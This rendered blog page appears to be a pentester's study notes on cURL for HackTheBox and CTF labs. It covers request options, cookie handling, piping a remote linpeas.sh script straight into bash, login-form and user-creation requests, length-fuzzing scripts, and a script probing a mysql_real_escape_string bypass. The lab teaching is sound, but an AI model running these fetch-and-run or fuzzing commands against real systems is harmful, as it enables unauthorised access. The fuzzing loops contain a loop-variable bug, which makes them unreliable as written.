@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CURL - G.R</title>
+<meta name="description" content="cURL (Client URL) is a CLI program used to establish communication with various protocols and retrieve information. It is a good tool for pentesting because it provides raw data from a web application.">
+<meta name="author" content="Giorgi Rcheulishvili">
+<link rel="canonical" href="http://localhost:1313/archive/notes/1-web-applications/1a-web-requests/1a2-curl/">
+
+
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/pygments.css">
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+</head>
+<body>
+
+<div class="navbar navbar-default navbar-fixed-top" role="navigation">
+  <div class="container">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a href="/" class="navbar-brand">G.R</a>
+    </div>
+    <div class="collapse navbar-collapse navbar-ex1-collapse">
+      <ul class="nav navbar-nav">
+        
+          
+          <li><a href="/research/">Research</a></li>
+        
+          
+          <li><a href="/projects/">Projects</a></li>
+        
+          
+          <li class="active"><a href="/archive/">Archive</a></li>
+        
+          
+          <li><a href="/about/">About</a></li>
+        
+          
+          <li><a href="/manifesto/">Approach</a></li>
+        
+      </ul>
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            
+            
+            
+            
+            
+            
+            <li class="active"><a href="/archive/notes/1-web-applications/1a-web-requests/1a2-curl/" hreflang="en">EN</a></li>
+          
+            
+            
+            
+            
+            
+            
+              
+                
+                  
+                
+              
+              
+            
+            <li><a href="/ka/untranslated/?from=%2Farchive%2Fnotes%2F1-web-applications%2F1a-web-requests%2F1a2-curl%2F&amp;t=CURL" hreflang="ka">ქარ</a></li>
+          
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+<div class="container">
+  <div class="row">
+    <div class="col-sm-9">
+      
+<ol class="breadcrumb">
+  <li><a href="/"><i class="fa fa-home"></i></a></li>
+  
+  <li><a href="/archive/notes/1-web-applications/1a-web-requests/">Web Requests</a></li>
+  
+  <li class="active">CURL</li>
+</ol>
+
+      
+
+<article>
+  <header class="page-header">
+    <h1>CURL</h1>
+  </header>
+
+  
+  <div class="panel panel-default">
+    <div class="panel-body post-info">
+      <span class="label label-success">6 min read</span>
+      
+      
+      <span class="label label-default">Category</span>
+      <a href="/archive/notes/1-web-applications/1a-web-requests/">Web Requests</a>
+      
+      
+    </div>
+  </div>
+  
+
+  <div class="entry-content">
+    <p>cURL (Client URL) is a CLI program used to establish communication with various protocols and retrieve information. It is a good tool for pentesting because it provides raw data from a web application.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Usage: curl <span class="o">[</span>options...<span class="o">]</span> &lt;url&gt;
+</span></span><span class="line"><span class="cl"> -d, --data &lt;data&gt;           HTTP POST data
+</span></span><span class="line"><span class="cl"> -f, --fail                  Fail fast with no output on HTTP errors
+</span></span><span class="line"><span class="cl"> -h, --help &lt;category&gt;       Get <span class="nb">help</span> <span class="k">for</span> commands
+</span></span><span class="line"><span class="cl"> -i, --include               Include response headers in output
+</span></span><span class="line"><span class="cl"> -o, --output &lt;file&gt;         Write to file instead of stdout
+</span></span><span class="line"><span class="cl"> -O, --remote-name           Write output to file named as remote file
+</span></span><span class="line"><span class="cl"> -s, --silent                Silent mode
+</span></span><span class="line"><span class="cl"> -T, --upload-file &lt;file&gt;    Transfer <span class="nb">local</span> FILE to destination
+</span></span><span class="line"><span class="cl"> -u, --user &lt;user:password&gt;  Server user and password
+</span></span><span class="line"><span class="cl"> -A, --user-agent &lt;name&gt;     Send User-Agent &lt;name&gt; to server
+</span></span><span class="line"><span class="cl"> -v, --verbose               Make the operation more talkative
+</span></span><span class="line"><span class="cl"> -V, --version               Show version number and quit
+</span></span></code></pre></div><pre tabindex="0"><code>-d is used to insert information into the URL
+-H is used to specify HTTP Headers
+-X is used to specify the request type (GET, POST, PUT, DELETE...)
+- POST create/upload
+- PUT replace
+- DELETE delete
+- GET read
+-v print verbose
+-i print response header
+-I show header only
+-u authentication arguments `curl -u admin:admin http://example.com/auth.php`
+</code></pre><p>Replacing information in the database using the CRUD API on the website</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X PUT 94.237.53.157:42065/api.php/city/Tbilisi -d <span class="s1">&#39;{&#34;city_name&#34;:&#34;flag&#34;, &#34;country_name&#34;:&#34;(HTB)&#34;}&#39;</span> -H <span class="s1">&#39;Content-Type: application/json&#39;</span>
+</span></span></code></pre></div><h3 id="curl-get-parameters">cURL GET parameters</h3>
+<p>HTTP GET variables can be set by adding them to the URL.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ curl http://10.10.10.10/index.php?sessionid<span class="o">=</span>vn0g4d94rs09rgpqga85r9bnia
+</span></span></code></pre></div><h3 id="curl-post-parameters">cURL POST parameters</h3>
+<p>HTTP POST variables can be set using the -d (&ndash;data) parameter.<br>
+Here is a simple login test example:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ curl --data <span class="s2">&#34;email=test@test.com&amp;password=test&#34;</span> http://10.10.10.10/login.php
+</span></span></code></pre></div><h3 id="curl-cookies">cURL COOKIES</h3>
+<p>cURL has an entire cookie engine that can be used to store and load cookies passed to it from a server between sessions:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ curl -b oldcookies.txt -c newcookies.txt http://10.10.10.10/login.php
+</span></span></code></pre></div><p>You can also specify your own cookies using the -b parameter:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ curl -b <span class="s2">&#34;PHPSESSID=vn0g4d94rs09rgpqga85r9bnia&#34;</span> http://10.10.10.10/home.php
+</span></span></code></pre></div><h3 id="curl-user-agents">cURL User Agents</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ curl -A <span class="s2">&#34;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)&#34;</span> http://10.10.10.10/login.php
+</span></span></code></pre></div><h3 id="curl-save-the-server-response-to-a-file">cURL Save the server response to a file</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ curl -o payload.sh http://10.10.10.10/payload.sh
+</span></span></code></pre></div><h3 id="curl-download-a-file-to-the-current-folder">cURL download a file to the current folder</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ curl -O http://10.10.10.10/payload.zip
+</span></span></code></pre></div><h3 id="curl-follow-http11-302-found-redirects">cURL follow HTTP/1.1 302 Found redirects</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">curl -L http://10.10.10.10/profile.php
+</span></span></code></pre></div><h3 id="curl-output-response-headers-to-stdout">cURL Output Response Headers to STDOUT</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ curl -i http://10.10.10.10/profile.php
+</span></span></code></pre></div><h3 id="curl-view-verbose-debugging-information-response-headers-and-other-debug-details---std2">cURL view verbose debugging information (response headers and other debug details - STD2)</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ curl -v http://10.10.10.10/profile.php
+</span></span></code></pre></div><h2 id="hacking-with-curl">Hacking with cURL</h2>
+<p>Now that we have covered the basic syntax and use cases, here are some practical hacking applications that are very helpful on Hackthebox or CTF boxes.</p>
+<h3 id="using-curl-to-pipe-a-remote-scipt-linpeassh-directly-to-bash">Using cURL to pipe a remote scipt (linpeas.sh) directly to bash:</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ curl -sSk <span class="s2">&#34;http://10.10.10.10/linpeas.sh&#34;</span> <span class="p">|</span> bash
+</span></span></code></pre></div><h3 id="attacking-a-login-form-with-curl">Attacking a Login Form with cURL</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ curl --data <span class="s2">&#34;email=test@test.com&amp;password=test&#34;</span> http://10.10.10.10/login.php
+</span></span></code></pre></div><h3 id="creating-new-users-with-curl">Creating new users with cURL</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ curl --data <span class="s2">&#34;name=test&amp;email=test@test.com&amp;password=test&#34;</span> http://10.10.10.10/newuser.php
+</span></span></code></pre></div><h2 id="fuzzing-web-servers-with-curl">Fuzzing Web Servers with cURL</h2>
+<p>Often we performing an assessment against a webserver, we will attempt to trigger error conditions which will provide some deeper insights into the underlying processes and software. cURL can be a powerful fuzzing tool for generating these edge case error messages.</p>
+<h3 id="fuzzing-with-uri-length--get-parameter-length-limits-with-curl">Fuzzing with URI length / GET parameter length limits with cURL</h3>
+<p>The following script can be used to fuzz a webserver with a long URL track the changes in output and write the output to a file. It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash. You can modify the url to either fuzz a URI or a GET parameter.</p>
+<p>Here is the bash shell script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;args: &lt;URL&gt; &lt;Start Length #&gt; &lt;End Length #&gt; &lt;Output Filepath&gt;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Length Lines Words Bytes Filename&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;---------------------------------&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="o">((</span><span class="nv">i</span> <span class="o">=</span> <span class="nv">$2</span><span class="p">;</span> x &lt;<span class="o">=</span> <span class="nv">$3</span><span class="p">;</span> i++<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">do</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">fuzz</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">((</span><span class="nv">x</span> <span class="o">=</span> 1<span class="p">;</span> x &lt;<span class="o">=</span> <span class="nv">$i</span><span class="p">;</span> x++<span class="o">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">do</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">fuzz</span><span class="o">+=</span><span class="s2">&#34;A&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">done</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#echo &#34;COUNT: $i $fuzz&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#echo &#34;${1}${fuzz}&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">i</span><span class="si">}</span><span class="s2">&#34;</span> <span class="p">|</span> <span class="o">{</span> tr -d <span class="s1">&#39;\n&#39;</span> <span class="p">;</span> curl <span class="s2">&#34;</span><span class="si">${</span><span class="nv">1</span><span class="si">}${</span><span class="nv">fuzz</span><span class="si">}</span><span class="s2">&#34;</span> -o <span class="si">${</span><span class="nv">4</span><span class="si">}</span> 2&gt;/dev/null <span class="p">|</span> wc <span class="si">${</span><span class="nv">4</span><span class="si">}</span><span class="p">;</span> <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></div><p>Here is an example of what it looks like running:</p>
+<pre tabindex="0"><code>./fuzz_url.sh http://10.10.10.10/ 1000 1000000 output.txt
+args: &lt;URL&gt; &lt;Start Length #&gt; &lt;End Length #&gt; &lt;Output Filepath&gt;
+Length Lines Words Bytes Filename
+---------------------------------
+1000 9  31 274 output.txt
+...
+...
+100000 11  37 343 output.txt
+100001 11  37 343 output.txt
+100002 11  37 343 output.txt
+100003 11  37 343 output.txt
+100004 11  37 343 output.txt
+100005 11  37 343 output.txt
+</code></pre><h3 id="fuzzing-post-parameter-length-limits-with-curl">Fuzzing POST parameter length limits with cURL</h3>
+<p>The following script can be used to fuzz a webserver POST parameters and write the output to a file and track changes to that output. It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash.</p>
+<p>Here is the bash shell script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;args: &lt;URL&gt; &lt;Start Length #&gt; &lt;End Length #&gt; &lt;Output Filepath&gt; &lt;Post data: var=value&amp;var2=valuefuzz&gt;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Length Lines Words Bytes Filename&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;---------------------------------&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="o">((</span><span class="nv">i</span> <span class="o">=</span> <span class="nv">$2</span><span class="p">;</span> x &lt;<span class="o">=</span> <span class="nv">$3</span><span class="p">;</span> i++<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">do</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">fuzz</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">((</span><span class="nv">x</span> <span class="o">=</span> 1<span class="p">;</span> x &lt;<span class="o">=</span> <span class="nv">$i</span><span class="p">;</span> x++<span class="o">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">do</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">fuzz</span><span class="o">+=</span><span class="s2">&#34;A&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">done</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#echo &#34;COUNT: $i $fuzz&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#echo &#34;${5}${fuzz}&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">i</span><span class="si">}</span><span class="s2">&#34;</span> <span class="p">|</span> <span class="o">{</span> tr -d <span class="s1">&#39;\n&#39;</span> <span class="p">;</span> curl <span class="s2">&#34;</span><span class="si">${</span><span class="nv">1</span><span class="si">}</span><span class="s2">&#34;</span> -o <span class="si">${</span><span class="nv">4</span><span class="si">}</span> -d <span class="s2">&#34;</span><span class="si">${</span><span class="nv">5</span><span class="si">}${</span><span class="nv">fuzz</span><span class="si">}</span><span class="s2">&#34;</span> 2&gt;/dev/null <span class="p">|</span> wc <span class="si">${</span><span class="nv">4</span><span class="si">}</span><span class="p">;</span> <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></div><p>Here is an example of what it looks like running:</p>
+<pre tabindex="0"><code>./fuzz_post.sh http://10.10.10.10/ 1000 1000000 output.txt &#34;user=test&amp;password=test&#34;
+args: &lt;URL&gt; &lt;Start Length #&gt; &lt;End Length #&gt; &lt;Output Filepath&gt;
+Length Lines Words Bytes Filename
+---------------------------------
+1000 9  31 274 output.txt
+...
+...
+100000 11  37 343 output.txt
+100001 11  37 343 output.txt
+</code></pre><h3 id="check-to-see-if-a-user-login-is-correct-in-a-bash-script">Check to see if a user login is correct in a Bash script</h3>
+<p>The following script can be used to verify that a username and login is correct. It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash. It will check the response length characters to see if it is a valid response. You will need to adjust the expected character count for your application.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="nv">result</span><span class="o">=(</span><span class="k">$(</span>curl --data <span class="s2">&#34;email=</span><span class="nv">$2</span><span class="s2">&amp;password=</span><span class="nv">$3</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> 2&gt;/dev/null <span class="p">|</span> wc -c<span class="k">)</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">$result</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$result</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s1">&#39;0&#39;</span> <span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="k">then</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s1">&#39;zero&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s1">&#39;NOT zero&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span></code></pre></div><p>Here is the script in action:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./check_user.sh http://10.10.10.10/login.php test@test.com testpassword
+</span></span><span class="line"><span class="cl"><span class="m">0</span>
+</span></span><span class="line"><span class="cl">NOT zero
+</span></span></code></pre></div><h3 id="automate-user-creation-and-test-for-mysql_real_escape_string-bypass">Automate user creation and test for mysql_real_escape_string bypass</h3>
+<p>The following is a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash. Here is a bash script I created for a CTF to validate a theory I had about its use of the PHP mysql_real_escape_string method:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="c1"># Test for mysql_real_escape_string</span>
+</span></span><span class="line"><span class="cl"><span class="nv">email</span><span class="o">=</span>test@test.com
+</span></span><span class="line"><span class="cl"><span class="nv">password</span><span class="o">=</span><span class="m">1234567890123456789012345678901234567890123456789012345678901234567890123456789</span>
+</span></span><span class="line"><span class="cl"><span class="nv">fuzz</span><span class="o">=</span><span class="s2">&#34;뽜’’AA&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">name</span><span class="o">=</span><span class="s2">&#34;‘¿’’AA&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">ip</span><span class="o">=</span><span class="s2">&#34;10.10.10.10&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Creating User: </span><span class="si">${</span><span class="nv">email</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">curl -i -b <span class="s1">&#39;cookies.txt&#39;</span> -c <span class="s1">&#39;cookies.txt&#39;</span> -d <span class="s2">&#34;name=</span><span class="si">${</span><span class="nv">name</span><span class="si">}</span><span class="s2">&amp;email=</span><span class="si">${</span><span class="nv">email</span><span class="si">}</span><span class="s2">&amp;password=</span><span class="si">${</span><span class="nv">password</span><span class="si">}</span><span class="s2">&amp;type=Admin&#34;</span> <span class="s2">&#34;http://</span><span class="si">${</span><span class="nv">ip</span><span class="si">}</span><span class="s2">/index.php&#34;</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34; &#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;============================================&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Login as User&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;============================================&#34;</span>
+</span></span><span class="line"><span class="cl">curl -i -c <span class="s1">&#39;cookies.txt&#39;</span> -d <span class="s2">&#34;email=</span><span class="si">${</span><span class="nv">email</span><span class="si">}</span><span class="s2">&amp;password=</span><span class="si">${</span><span class="nv">password</span><span class="si">}</span><span class="s2">&amp;type=Admin&#34;</span> <span class="s2">&#34;http://</span><span class="si">${</span><span class="nv">ip</span><span class="si">}</span><span class="s2">/index.php&#34;</span> 2&gt;/dev/null  <span class="p">|</span> grep <span class="s1">&#39;location&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34; &#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;============================================&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Check user profile with cookie&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;============================================&#34;</span>
+</span></span><span class="line"><span class="cl">curl -b <span class="s1">&#39;cookies.txt&#39;</span> <span class="s2">&#34;http://</span><span class="si">${</span><span class="nv">ip</span><span class="si">}</span><span class="s2">/index.php&#34;</span> -v 2&gt;/dev/null <span class="p">|</span> grep <span class="s1">&#39;td align=&#34;center&#34;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34; &#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;============================================&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Change Name&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;============================================&#34;</span>
+</span></span><span class="line"><span class="cl">curl -b <span class="s1">&#39;cookies.txt&#39;</span> -d <span class="s2">&#34;name=</span><span class="si">${</span><span class="nv">fuzz</span><span class="si">}</span><span class="s2">&amp;type=Admin&#34;</span> <span class="s2">&#34;http://</span><span class="si">${</span><span class="nv">1</span><span class="si">}</span><span class="s2">/index.php&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34; &#34;</span> 
+</span></span><span class="line"><span class="cl">curl -b <span class="s1">&#39;cookies.txt&#39;</span> <span class="s2">&#34;http://</span><span class="si">${</span><span class="nv">ip</span><span class="si">}</span><span class="s2">/profile.php&#34;</span> 2&gt;/dev/null <span class="p">|</span> grep <span class="s1">&#39;td align=&#34;center&#34;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34; &#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34; DELETEING COOKIE &#34;</span>
+</span></span><span class="line"><span class="cl">rm cookies.txt
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;============================================&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Relogin as User - did password change?&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;============================================&#34;</span>
+</span></span><span class="line"><span class="cl">curl -i -c <span class="s1">&#39;cookies.txt&#39;</span> -d <span class="s2">&#34;email=</span><span class="si">${</span><span class="nv">email</span><span class="si">}</span><span class="s2">&amp;password=</span><span class="si">${</span><span class="nv">password</span><span class="si">}</span><span class="s2">&amp;type=Admin&#34;</span> <span class="s2">&#34;http://</span><span class="si">${</span><span class="nv">ip</span><span class="si">}</span><span class="s2">/index.php&#34;</span>  2&gt;/dev/null  <span class="p">|</span> grep <span class="s1">&#39;location&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34; &#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34; DONE!&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34; DELETEING COOKIE &#34;</span>
+</span></span><span class="line"><span class="cl">rm cookies.txt
+</span></span></code></pre></div>
+  </div>
+</article>
+
+    </div>
+    <div class="col-sm-3" id="sidebar">
+      <aside>
+
+
+<div id="aboutme">
+  <p><img class="img-thumbnail" src="http://localhost:1313/images/logo.png" alt="Giorgi Rcheulishvili"></p>
+  <p><strong>About Me: Giorgi Rcheulishvili</strong><br>Systems and infrastructure engineering - automation, containerization, and offensive security.</p>
+</div>
+
+
+<section class="well well-sm">
+  <ul class="list-group">
+
+    
+    <li class="list-group-item">
+      <h4>Social</h4>
+      <a href="https://github.com/grcheulishvili" target="_blank" rel="noopener"><i class="fa fa-github-square fa-lg"></i></a> 
+      <a href="https://www.linkedin.com/in/giorgi-rcheulishvili-bba988260/" target="_blank" rel="noopener"><i class="fa fa-linkedin-square fa-lg"></i></a>
+    </li>
+    
+
+    
+    
+    <li class="list-group-item">
+      <h4>Recent Posts</h4>
+      <ul class="list-group">
+        
+        <li class="list-group-item"><a href="/about/">Technical Biography</a></li>
+        
+        <li class="list-group-item"><a href="/manifesto/">Engineering Philosophy</a></li>
+        
+        <li class="list-group-item"><a href="/research/building-a-polymorphic-engine/">Polymorphic Engine Development</a></li>
+        
+        <li class="list-group-item"><a href="/research/stack-mechanics-and-overflows/">The Mechanical Inevitability of Buffer Overflows</a></li>
+        
+        <li class="list-group-item"><a href="/archive/ssrf-exploitation/">Research: Server-Side Request Forgery (SSRF) Mechanics</a></li>
+        
+      </ul>
+    </li>
+    
+
+    
+    <li class="list-group-item">
+      <h4>Categories</h4>
+      <ul class="list-group">
+        
+        <li class="list-group-item"><a href="/research/">Research <span class="badge">3</span></a></li>
+        
+        <li class="list-group-item"><a href="/archive/">Archives <span class="badge">18</span></a></li>
+        
+        <li class="list-group-item"><a href="/projects/">Projects <span class="badge">3</span></a></li>
+        
+        <li class="list-group-item"><a href="/engineering/">Engineering <span class="badge">1</span></a></li>
+        
+      </ul>
+    </li>
+    
+
+    
+    <li class="list-group-item">
+      <h4>Tags</h4>
+      <div class="tag-cloud">
+        
+        <a href="/tags/assembly" class="tag-2">assembly</a>
+        
+        <a href="/tags/c2" class="tag-2">c2</a>
+        
+        <a href="/tags/ctfd" class="tag-2">ctfd</a>
+        
+        <a href="/tags/cti" class="tag-2">cti</a>
+        
+        <a href="/tags/databases" class="tag-2">databases</a>
+        
+        <a href="/tags/devsecops" class="tag-2">devsecops</a>
+        
+        <a href="/tags/docker" class="tag-2">docker</a>
+        
+        <a href="/tags/elk" class="tag-2">elk</a>
+        
+        <a href="/tags/engineering" class="tag-2">engineering</a>
+        
+        <a href="/tags/go" class="tag-2">go</a>
+        
+        <a href="/tags/grafana" class="tag-2">grafana</a>
+        
+        <a href="/tags/hardening" class="tag-2">hardening</a>
+        
+        <a href="/tags/infrastructure" class="tag-2">infrastructure</a>
+        
+        <a href="/tags/internals" class="tag-2">internals</a>
+        
+        <a href="/tags/linux" class="tag-2">linux</a>
+        
+        <a href="/tags/maldev" class="tag-2">maldev</a>
+        
+        <a href="/tags/monitoring" class="tag-2">monitoring</a>
+        
+        <a href="/tags/network-security" class="tag-2">network security</a>
+        
+        <a href="/tags/pentesting" class="tag-2">pentesting</a>
+        
+        <a href="/tags/portswigger" class="tag-2">portswigger</a>
+        
+        <a href="/tags/postgresql" class="tag-2">postgresql</a>
+        
+        <a href="/tags/python" class="tag-2">python</a>
+        
+        <a href="/tags/rce" class="tag-2">rce</a>
+        
+        <a href="/tags/red-team" class="tag-2">red team</a>
+        
+        <a href="/tags/research" class="tag-2">research</a>
+        
+        <a href="/tags/reverse-engineering" class="tag-2">reverse engineering</a>
+        
+        <a href="/tags/sqli" class="tag-2">sqli</a>
+        
+        <a href="/tags/ssrf" class="tag-2">ssrf</a>
+        
+        <a href="/tags/web-security" class="tag-2">web security</a>
+        
+      </div>
+    </li>
+    
+
+    
+    
+    
+    
+    <li class="list-group-item">
+      <h4>Archives</h4>
+      <ul class="list-group">
+        
+        <li class="list-group-item">2025</li>
+        
+        <li class="list-group-item">2024</li>
+        
+      </ul>
+    </li>
+    
+
+  </ul>
+</section>
+</aside>
+
+    </div>
+  </div>
+</div>
+
+<footer>
+  <div class="container">
+    <hr>
+    <div class="row">
+      <div class="col-xs-10">
+        &copy; 2026 Giorgi Rcheulishvili
+        &middot; Powered by
+        <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a>,
+        <a href="https://getbootstrap.com/docs/3.4/" target="_blank" rel="noopener">Bootstrap</a>,
+        theme styled after
+        <a href="https://github.com/getpelican/pelican-themes/tree/master/pelican-bootstrap3" target="_blank" rel="noopener">pelican-bootstrap3</a>
+      </div>
+      <div class="col-xs-2">
+        <p class="pull-right"><i class="fa fa-arrow-up"></i> <a href="#">Back to top</a></p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+</body>
+</html>
